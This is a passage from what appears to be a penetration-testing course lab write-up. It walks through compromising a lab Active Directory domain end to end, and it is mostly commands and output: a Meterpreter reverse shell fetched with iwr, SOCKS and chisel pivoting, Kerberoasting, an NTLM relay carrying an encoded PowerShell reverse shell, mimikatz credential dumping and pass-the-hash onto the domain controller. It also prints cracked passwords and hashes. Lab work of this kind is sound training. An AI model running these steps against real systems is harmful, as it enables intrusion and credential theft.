msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp

msf6 exploit(multi/handler) > set LHOST 192.168.119.5
LHOST => 192.168.119.5

msf6 exploit(multi/handler) > set LPORT 443
LPORT => 443

msf6 exploit(multi/handler) > set ExitOnSession false
ExitOnSession => false

msf6 exploit(multi/handler) > run -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[*] Started HTTPS reverse handler on https://192.168.119.5:443
```

Downloading _**met.exe**_ on CLIENTWK1 so we get our session:

{% code overflow="wrap" %}
```powershell
PS C:\Users\marcus> iwr -uri http://192.168.119.5:8000/met.exe -Outfile met.exe

PS C:\Users\marcus> .\met.exe
```
{% endcode %}

Catching our session and using **multi/manage/autoroute** and **auxiliary/server/socks\_proxy** to create a SOCKS5 proxy toa ccess the internal network from our Kali box:

{% code overflow="wrap" %}
```bash
[*] Meterpreter session 1 opened (192.168.119.5:443 -> 192.168.50.242:64234) at 2022-10-11 07:05:22 -0400

msf6 exploit(multi/handler) > use multi/manage/autoroute

msf6 post(multi/manage/autoroute) > set session 1
session => 1

msf6 post(multi/manage/autoroute) > run
[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: windows
[*] Running module against CLIENTWK1
[*] Searching for subnets to autoroute.
[+] Route added to subnet 172.16.6.0/255.255.255.0 from host's routing table.
[*] Post module execution completed

msf6 post(multi/manage/autoroute) > use auxiliary/server/socks_proxy

msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
SRVHOST => 127.0.0.1

msf6 auxiliary(server/socks_proxy) > set VERSION 5
VERSION => 5

msf6 auxiliary(server/socks_proxy) > run -j
[*] Auxiliary module running as background job 2.
```
{% endcode %}

Update our **/etc/proxychains4.conf** to use the correct settings:

{% code overflow="wrap" %}
```bash
kali@kali:~/beyond$ cat /etc/proxychains4.conf
...
socks5  127.0.0.1 1080
```
{% endcode %}

Using crackmapexec's SMB module to gather shares information using **john's** credentials:

{% code overflow="wrap" %}
```bash
kali@kali:~/beyond$ proxychains -q crackmapexec smb 172.16.6.240-241 172.16.6.254 -u john -d beyond.com -p "dqsTwTpZPn#nL" --shares
SMB         172.16.6.240    445    DCSRV1           [*] Windows 10.0 Build 20348 x64 (name:DCSRV1) (domain:beyond.com) (signing:True) (SMBv1:False)
SMB         172.16.6.241    445    INTERNALSRV1     [*] Windows 10.0 Build 20348 x64 (name:INTERNALSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
SMB         172.16.6.254    445    MAILSRV1         [*] Windows 10.0 Build 20348 x64 (name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
SMB         172.16.6.240    445    DCSRV1           [+] beyond.com\john:dqsTwTpZPn#nL 
SMB         172.16.6.241    445    INTERNALSRV1     [+] beyond.com\john:dqsTwTpZPn#nL 
SMB         172.16.6.240    445    DCSRV1           [+] Enumerated shares
SMB         172.16.6.240    445    DCSRV1           Share           Permissions     Remark
SMB         172.16.6.240    445    DCSRV1           -----           -----------     ------
SMB         172.16.6.240    445    DCSRV1           ADMIN$                          Remote Admin
SMB         172.16.6.240    445    DCSRV1           C$                              Default share
SMB         172.16.6.240    445    DCSRV1           IPC$            READ            Remote IPC
SMB         172.16.6.240    445    DCSRV1           NETLOGON        READ            Logon server share 
SMB         172.16.6.240    445    DCSRV1           SYSVOL          READ            Logon server share 
SMB         172.16.6.241    445    INTERNALSRV1     [+] Enumerated shares
SMB         172.16.6.241    445    INTERNALSRV1     Share           Permissions     Remark
SMB         172.16.6.241    445    INTERNALSRV1     -----           -----------     ------
SMB         172.16.6.241    445    INTERNALSRV1     ADMIN$                          Remote Admin
SMB         172.16.6.241    445    INTERNALSRV1     C$                              Default share
SMB         172.16.6.241    445    INTERNALSRV1     IPC$            READ            Remote IPC
SMB         172.16.6.254    445    MAILSRV1         [+] beyond.com\john:dqsTwTpZPn#nL 
SMB         172.16.6.254    445    MAILSRV1         [+] Enumerated shares
SMB         172.16.6.254    445    MAILSRV1         Share           Permissions     Remark
SMB         172.16.6.254    445    MAILSRV1         -----           -----------     ------
SMB         172.16.6.254    445    MAILSRV1         ADMIN$                          Remote Admin
SMB         172.16.6.254    445    MAILSRV1         C$                              Default share
SMB         172.16.6.254    445    MAILSRV1         IPC$            READ            Remote IPC
```
{% endcode %}

{% hint style="warning" %}
CrackMapExec version 5.4.0 may throw the error **The NETBIOS connection with the remote host is timed out** for DCSRV1 or doesn't provide any output at all. Version 5.4.1 contains a fix to address this issue.
{% endhint %}

Because MAILSRV1 and INTERNALSRV1 have SMB signing set to False, we may be able to perform relay attacks if we can force an authentication request.

Performing an nmap scan on the targets. We must specify **-sT** to perform a TCP scan, otherwise Nmap will not work over Proxychains:

```bash
kali@kali:~/beyond$ sudo proxychains -q nmap -sT -oN nmap_servers -Pn -p 21,80,443 172.16.6.240 172.16.6.241 172.16.6.254
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-11 07:17 EDT
Nmap scan report for 172.16.6.240
Host is up (2.2s latency).

PORT    STATE  SERVICE
21/tcp  closed ftp
80/tcp  closed http
443/tcp closed https

Nmap scan report for internalsrv1.beyond.com (172.16.6.241)
Host is up (0.21s latency).

PORT    STATE  SERVICE
21/tcp  closed ftp
80/tcp  open   http
443/tcp open   https

Nmap scan report for 172.16.6.254
Host is up (0.20s latency).

PORT    STATE  SERVICE
21/tcp  closed ftp
80/tcp  open   http
443/tcp closed https

Nmap done: 3 IP addresses (3 hosts up) scanned in 14.34 seconds
```

{% hint style="danger" %}
Use chisel v1.7.7 (go1.17.6). Future versions have weird issues.
{% endhint %}

Using chisel to tunnel our traffic through CLIENTWK1 to INTERNALSRV1:

```bash
kali@kali:~/beyond$ chmod a+x chisel

kali@kali:~/beyond$ ./chisel server -p 8080 --reverse
2022/10/11 07:20:46 server: Reverse tunnelling enabled
2022/10/11 07:20:46 server: Fingerprint UR6ly2hYyr8iefMfm+gK5mG1R06nTKJF0HV+2bAws6E=
2022/10/11 07:20:46 server: Listening on http://0.0.0.0:8080
```

```bash
msf6 auxiliary(server/socks_proxy) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > upload chisel.exe C:\\Users\\marcus\\chisel.exe
[*] Uploading  : /home/kali/beyond/chisel.exe -> C:\Users\marcus\chisel.exe
[*] Uploaded 7.85 MiB of 7.85 MiB (100.0%): /home/kali/beyond/chisel.exe -> C:\Users\marcus\chisel.exe
[*] Completed  : /home/kali/beyond/chisel.exe -> C:\Users\marcus\chisel.exe

```

{% code overflow="wrap" %}
```batch
C:\Users\marcus> chisel.exe client 192.168.119.5:8080 R:80:172.16.6.241:80
2022/10/11 07:22:46 client: Connecting to ws://192.168.119.5:8080
2022/10/11 07:22:46 client: Connected (Latency 11.0449ms)

```
{% endcode %}

{% hint style="info" %}
I ran into several issues with chisel here. In my case, I just stopped using it and resorted to `proxychains firefox &` and went directly to http://172.16.6.241
{% endhint %}

With chisel connected, we can now browse to port 80 on 172.16.6.241 via port 80 on our Kali machine (127.0.0.1) by using Firefox:

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption><p>WordPress page on INTERNALSRV1 (172.16.6.241)</p></figcaption></figure>

Attempting to browse to **http://127.0.0.1/wordpress/wp-admin** results in an _Unable to connect_ error due to name resolution for the internal server. Adding it to our **hosts** file will help here:

{% code overflow="wrap" %}
```bash
kali@kali:~/beyond$ cat /etc/hosts                         
127.0.0.1       localhost
127.0.1.1       kali
...
127.0.0.1    internalsrv1.beyond.com
# In my case it was:
# 172.16.6.241    internalsrv1.beyond.com
...
```
{% endcode %}

Now we can properly get to the Administrator login page of Wordpress on INTERNALSRV1. Trying our current collection of credentials fails to get us in as well as common passwords like **admin:admin**.

## Attacking an Internal Web Application

### Speak Kerberoast and Enter

Moving onto kerberoasting using our one set of valid credentials:

{% code overflow="wrap" %}
```bash
kali@kali:~/beyond$ proxychains -q impacket-GetUserSPNs -request -dc-ip 172.16.6.240 beyond.com/john
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
ServicePrincipalName      Name     MemberOf  PasswordLastSet             LastLogon                   Delegation 
------------------------  -------  --------  --------------------------  --------------------------  ----------
http/internalsrv1.beyond.com  daniela            2022-09-29 04:17:20.062328  2022-10-05 03:59:48.376728             

[-] CCache file is not found. Skipping...
$krb5tgs$23$*daniela$BEYOND.COM$beyond.com/daniela*$4c6c4600baa0ef09e40fde6130e3d770$49023c03dcf9a21ea5b943e179f843c575d8f54b1cd85ab12658364c23a46fa53b3db5f924a66b1b28143f6a357abea0cf89af42e08fc38d23b205a3e1b46aed9e181446fa7002def837df76ca5345e3277abaa86...
2e430c5a8f0235b45b66c5fe0c8b4ba16efc91586fc22c2c9c1d8d0434d4901d32665cceac1ab0cdcb89ae2c2d688307b9c5d361beba29b75827b058de5a5bba8e60af3562f935bd34feebad8e94d44c0aebc032a3661001541b4e30a20d380cac5047d2dafeb70e1ca3f9e507eb72a4c7
```
{% endcode %}

{% hint style="warning" %}
More troubles, if connection is refused immediately, try commenting out the **proxy\_dns** setting in **/etc/proxychains4.conf**
{% endhint %}

Storing the hash and using hashcat to try and crack it:

{% code overflow="wrap" %}
```bash
kali@kali:~/beyond$ sudo hashcat -m 13100 daniela.hash /usr/share/wordlists/rockyou.txt --force
...
$krb5tgs$23$*daniela$BEYOND.COM$beyond.com/daniela*$b0750f4754ff26fe77d2288ae3cca539$0922083b88587a2e765298cc7d499b368f7c39c7f6941a4b419d8bb1405e7097891c1af0a885ee76ccd1f32e988d6c4653e5cf4ab9602004d84a6e1702d2fbd5a3379bd376de696b0e8993aeef5b1e78fb24f5d3c
...
3d3e9d5c0770cc6754c338887f11b5a85563de36196b00d5cddecf494cfc43fcbef3b73ade4c9b09c8ef405b801d205bf0b21a3bca7ad3f59b0ac7f6184ecc1d6f066016bb37552ff6dd098f934b2405b99501f2287128bff4071409cec4e9545d9fad76e6b18900b308eaac8b575f60bb:DANIelaRO123
...
```
{% endcode %}

With the cracked password, let's try and login to WordPress at **/wp-admin** via our forwarded port:

<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

🎉 We're in! 🎉

### Abuse a WordPress Plugin for a Relay Attack

First let's gather information in WordPress, starting with configured users:

<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption><p>Daniela is the only WordPress user</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption><p>General WordPress settings</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption><p>Installed WordPress Plugins</p></figcaption></figure>

Checking out the only enabled plugin:

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption><p>Backup Migration plugin settings</p></figcaption></figure>

Potential attack vectors:

1. Attempt to upload a malicious WordPress plugin. Web shell or reverse shell.
2. Attempt to force an authentication via the _Backup directory path_ for a relay attack due to SMB signing being disabled.

Because the second vector results in code execution and provides a potential vector to achieve a goal of the penetration test, we'll attempt this one first.

Setting up **impacket-ntlmrelayx**. We'll use **--no-http-server** and **-smb2support** to disable the HTTP server and enable SMB2 support. We'll specify the external address for MAILSRV1, 192.168.50.242, as target for the relay attack. By entering the external address, we don't have to proxy our relay attack via Proxychains. Finally, we'll base64-encode a _PowerShell reverse shell_ [_oneliner_](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3) that will connect back to our Kali machine on port 9999 and provide it as a command to **-c:**

```bash
kali@kali:~/beyond$ sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.242 -c "powershell -enc JABjAGwAaQ..."
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client SMTP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
```

Setting up our reverse shell listener:

```bash
kali@kali:~/beyond$ nc -nvlp 9999
listening on [any] 9999 ...
```

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption><p>Modifying the <em>Backup directory path</em></p></figcaption></figure>

Save the modified directory path by scrolling down and clicking on _Save_. This _should_ cause the WordPress plugin to authenticate to our ntlmrelay.

{% code overflow="wrap" %}
```bash
...
[*] Authenticating against smb://192.168.50.242 as INTERNALSRV1/ADMINISTRATOR SUCCEED
...
[*] Service RemoteRegistry is in stopped state
...
[*] Starting service RemoteRegistry
...
[*] Executed specified command on host: 192.168.50.242
...
[*] Stopping service RemoteRegistry
```
{% endcode %}

We now see the reverse shell connection:

{% code overflow="wrap" %}
```powershell
connect to [192.168.119.5] from (UNKNOWN) [192.168.50.242] 50063
whoami
nt authority\system

PS C:\Windows\system32> hostname
MAILSRV1

PS C:\Windows\system32> 
```
{% endcode %}

## Gaining Access to the Domain Controller

### Cached Credentials

Downloading our previous meterpreter reverse shell:

{% code overflow="wrap" %}
```powershell
PS C:\Windows\system32> cd C:\Users\Administrator

PS C:\Users\Administrator> iwr -uri http://192.168.119.5:8000/met.exe -Outfile met.exe

PS C:\Users\Administrator> .\met.exe
```
{% endcode %}

Interacting with the session and spawning a new powershell command line shell:

{% code overflow="wrap" %}
```powershell
msf6 post(multi/manage/autoroute) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > shell
Process 416 created.
Channel 1 created.
Microsoft Windows [Version 10.0.20348.1006]
(c) Microsoft Corporation. All rights reserved.

C:\Users\Administrator> powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\Administrator> 
```
{% endcode %}

Transferring mimikatz and dumping credentials:

{% code overflow="wrap" %}
```powershell
PS C:\Users\Administrator> iwr -uri http://192.168.119.5:8000/mimikatz.exe -Outfile mimikatz.exe

PS C:\Users\Administrator> .\mimikatz.exe
.\mimi.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords
...
Authentication Id : 0 ; 253683 (00000000:0003def3)
Session           : Interactive from 1
User Name         : beccy
Domain            : BEYOND
Logon Server      : DCSRV1
Logon Time        : 3/8/2023 4:50:32 AM
SID               : S-1-5-21-1104084343-2915547075-2081307249-1108
        msv :
         [00000003] Primary
         * Username : beccy
         * Domain   : BEYOND
         * NTLM     : f0397ec5af49971f6efbdb07877046b3
         * SHA1     : 2d878614fb421517452fd99a3e2c52dee443c8cc
         * DPAPI    : 4aea2aa4fa4955d5093d5f14aa007c56
        tspkg :
        wdigest :
         * Username : beccy
         * Domain   : BEYOND
         * Password : (null)
        kerberos :
         * Username : beccy
         * Domain   : BEYOND.COM
         * Password : NiftyTopekaDevolve6655!#!
...
```
{% endcode %}

We got beccy's (a domain admin) password! Time to get over to the DC.

### Lateral Movement

Because we have the clear text password and NTLM hash for beccy, we can use impacket-psexec to get an interactive shell on DCSRV1. We could use either of these, in this example we use the hash:

{% code overflow="wrap" %}
```batch
kali@kali:~$ proxychains -q impacket-psexec -hashes 00000000000000000000000000000000:f0397ec5af49971f6efbdb07877046b3 beccy@172.16.6.240
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 172.16.6.240.....
[*] Found writable share ADMIN$
[*] Uploading file CGOrpfCz.exe
[*] Opening SVCManager on 172.16.6.240.....
[*] Creating service tahE on 172.16.6.240.....
[*] Starting service tahE.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.1006]
(c) Microsoft Corporation. All rights reserved.


C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
DCSRV1

C:\Windows\system32> ipconfig
 
Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 172.16.6.240
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.6.254
```
{% endcode %}

Penetration test complete! Time to write a report!

{% file src="../../../.gitbook/assets/Module 25 - Assembling the Pieces.pdf" %}
